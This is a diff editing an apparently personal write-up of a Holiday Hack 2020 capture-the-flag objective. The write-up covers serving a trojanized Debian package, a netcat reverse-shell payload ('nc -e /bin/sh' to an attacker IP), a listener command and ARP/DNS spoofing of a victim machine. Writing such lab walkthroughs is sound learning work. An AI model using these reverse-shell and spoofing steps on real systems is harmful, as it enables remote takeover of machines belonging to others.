@@ -408,7 +408,12 @@ Go to the NetWars room on the roof and help Alabaster Snowball get access back t
 "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"
 ~~~
 
-- Step 6: Create that file and make it call back to listener on local machine.
+- Step 6: Where ever you start your web server, make sure it is set up with the path below. This is where you will put your trojanized binary called "suriv_amd64.deb".
+
+~~~
+pub/jfrost/backdoor/
+~~~
+
 - Step 7: Determine payload to use. Simple nc reverse shell should work.
 
 ~~~
@@ -447,13 +452,13 @@ nc -e /bin/sh [attacking ip] 4444
 
 
 - Step 9: Start listener with "nc -nvlp 4444" 
-- Step 10: Get ARP and DNS responses going
+- Step 10: Get ARP and DNS responses going. Start DNS running first so it is ready as soon as infected machine gets ARP reply that causes it to go to the spoofed DNS server.
 - Step 11: Navigate to file contents in question:
 	- "cat *.txt | grep recused" (Looking for the individual who recused themselves from the vote.)
 
-Lesson Learned |
+Lessons Learned |
 -------------- |
-It's not really all that hard to spoof an ARP response once you understand some basic concepts. It's not really all that hard to spoof a DNS response once you understand some basic concepts. It's not really all that hard to create a simple Linux binary trojan once you understand some basic concepts. I had done none of these things before Holiday Hack 2020. Getting that binary to do a callback and give me a shell was aweXome! | 
+Learned critical concepts and practical application when it comes to ARP and DNS spoofing. Learned setup for a Linux binary trojan. I had done none of these things before Holiday Hack 2020. Getting that binary to do a callback and give me a shell was aweXome! | 
 
 
 # Objective 10: Defeat Fingerprint Sensor
